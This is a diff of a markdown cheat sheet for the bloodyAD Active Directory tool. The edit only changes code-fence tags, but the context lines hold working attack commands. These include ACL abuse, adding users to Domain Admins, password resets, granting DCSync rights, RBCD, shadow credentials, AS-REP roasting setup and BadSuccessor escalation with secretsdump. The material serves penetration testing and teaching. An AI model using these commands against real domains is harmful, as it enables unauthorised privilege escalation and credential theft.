@@ -9,7 +9,7 @@ Install: `pip install bloodyAD` or clone from [CravateRouge/bloodyAD](https://gi
 
 bloodyAD supports multiple credential types on the same base command. Every command follows the pattern `bloodyAD [auth flags] -d DOMAIN --host DC [subcommand]`.
 
-```bash
+```bash wrap
 # Cleartext password
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST [cmd]
 
@@ -38,7 +38,7 @@ The `get` and `msldap` subcommands cover the most useful recon paths. Start with
 
 `get writable` is the first command to run after gaining a foothold. It shows every AD object your current user has write access to, which directly maps to abuse paths.
 
-```bash
+```bash wrap
 # Find everything the current user can write to
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable
 
@@ -60,7 +60,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype U
 
 `get object` reads LDAP attributes of any single AD object. Use it to inspect userAccountControl flags, retrieve LAPS passwords, gMSA secrets, or group membership before attempting abuse.
 
-```bash
+```bash wrap
 # Read all attributes of a user
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get object svc_backup
 
@@ -85,7 +85,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 These commands help map group relationships and OU structure without needing BloodHound ingested.
 
-```bash
+```bash wrap
 # All groups a user belongs to (recursive by default)
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get membership $TARGET
 
@@ -102,7 +102,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 `get search` issues a raw LDAP query. Use it when no built-in subcommand covers what you need.
 
-```bash
+```bash wrap
 # Find all users with a description set (often contains passwords)
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   get search --filter '(&(objectClass=user)(description=*))' --attr sAMAccountName,description
@@ -117,7 +117,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 `get dnsDump` is useful for internal network mapping; it returns all DNS zone records the current user can read.
 
-```bash
+```bash wrap
 # Dump all DNS records from all zones
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump
 
@@ -127,7 +127,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump --zone $DO
 
 ### Trust Relationships
 
-```bash
+```bash wrap
 # Display domain trust tree
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get trusts
 ```
@@ -136,7 +136,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get trusts
 
 These `msldap` subcommands find delegation misconfigurations that feed into unconstrained, constrained, and RBCD attack chains.
 
-```bash
+```bash wrap
 # Find computers/users with unconstrained delegation (TrustedForDelegation flag)
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap unconstrained
 
@@ -149,7 +149,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap s4u2proxy
 
 ### Legacy and Service Accounts
 
-```bash
+```bash wrap
 # Pre-Windows 2000 machine accounts; often have predictable passwords (computer name lowercase)
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap pre2000
 
@@ -165,7 +165,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap asrep
 
 ### LAPS
 
-```bash
+```bash wrap
 # List all LAPS-enabled computers and retrieve passwords if permitted
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap laps
 
@@ -175,7 +175,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap lapstarget
 
 ### BadSuccessor Check
 
-```bash
+```bash wrap
 # Check if the domain is vulnerable to the BadSuccessor (dMSA) privilege escalation
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
 ```
@@ -188,7 +188,7 @@ ACL abuse flows directly from `get writable` output. These `add`, `remove`, and 
 
 Granting yourself GenericAll on an object gives complete control: you can change its password, modify its attributes, or add it to groups. Requires WriteDacl or ownership of the target.
 
-```bash
+```bash wrap
 # Grant your user GenericAll on a target user
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   add genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
@@ -202,7 +202,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 Adding yourself to a privileged group (e.g., Domain Admins, Backup Operators) is the fastest path to elevated access when you have GenericAll or WriteProperty on the group.
 
-```bash
+```bash wrap
 # Add a user to a group
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   add groupMember "Domain Admins" $TARGET
@@ -216,7 +216,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 Exploits ForceChangePassword or GenericAll rights. No knowledge of the current password is required.
 
-```bash
+```bash wrap
 # Change target user's password
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set password $TARGET 'NewPassword123!'
@@ -230,7 +230,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 Taking ownership of an object lets you then grant yourself any rights via WriteDacl. Requires WriteOwner on the target.
 
-```bash
+```bash wrap
 # Set yourself as owner of a target object
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set owner $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
@@ -240,7 +240,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 DCSync requires the Replicating Directory Changes and Replicating Directory Changes All extended rights on the domain root. If you have WriteDacl on the domain object, you can grant yourself these.
 
-```bash
+```bash wrap
 # Grant DCSync rights to a user
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   add dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
@@ -254,7 +254,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 `set object` writes any writable LDAP attribute directly. Use it for targeted Kerberoasting by adding an SPN to a user, or to clear attributes after abuse.
 
-```bash
+```bash wrap
 # Add an SPN to a user account to make it Kerberoastable (requires GenericWrite or WriteProperty)
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set object $TARGET servicePrincipalName -v "fake/spn.$DOMAIN"
@@ -272,7 +272,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 RBCD abuse requires write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer. bloodyAD handles the attribute encoding automatically.
 
-```bash
+```bash wrap
 # Set RBCD: allow EVIL$ to impersonate any user to TARGET$
 # Requires GenericAll, GenericWrite, or WriteProperty on TARGET$
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
@@ -289,7 +289,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 After setting RBCD, use `getST.py` to request the service ticket and then move laterally.
 
-```bash
+```bash wrap
 getST.py $DOMAIN/'$COMP_NAME':$COMP_PASS \
   -spn cifs/TARGET.$DOMAIN \
   -impersonate Administrator \
@@ -303,7 +303,7 @@ psexec.py -k -no-pass Administrator@TARGET.$DOMAIN
 
 Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute. Adding a Key Credential to a target account allows authentication as that account via PKINIT without knowing its password. Requires GenericAll or WriteProperty on the attribute.
 
-```bash
+```bash wrap
 # Add shadow credentials to a target user
 # bloodyAD generates the key pair and outputs the PEM files and NT hash automatically
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
@@ -324,7 +324,7 @@ The `add shadowCredentials` command outputs the certificate files and NT hash di
 
 UAC flags control account behaviour: pre-auth requirements, password expiry, account status, and more. Setting or unsetting these flags requires GenericAll or WriteProperty on the account.
 
-```bash
+```bash wrap
 # Disable Kerberos pre-authentication on a user (makes it AS-REP roastable)
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   add uac $TARGET -f DONT_REQ_PREAUTH
@@ -348,13 +348,13 @@ BadSuccessor is a privilege escalation path affecting Windows Server 2025 domain
 
 First confirm the vulnerability exists:
 
-```bash
+```bash wrap
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
 ```
 
 If vulnerable, create a dMSA targeting a privileged account:
 
-```bash
+```bash wrap
 # Create a dMSA under an OU where you have CreateChild rights
 # -t specifies the principal account whose privileges the dMSA will inherit
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
@@ -365,7 +365,7 @@ bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
 
 Then authenticate as the dMSA to get a TGT carrying the inherited privileges:
 
-```bash
+```bash wrap
 # Get a TGT as the dMSA (password is the one you set during creation)
 getTGT.py $DOMAIN/evilDMSA:$COMP_PASS -dc-ip $DC_IP
 
@@ -379,7 +379,7 @@ secretsdump.py -k -no-pass $DOMAIN/evilDMSA@$DC_HOST
 
 These commands cover object creation, deletion, and DNS record manipulation. Computer account creation is commonly needed as a prerequisite for RBCD attacks when MachineAccountQuota is above 0.
 
-```bash
+```bash wrap
 # Create a new domain user
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   add user newuser 'Password123!'
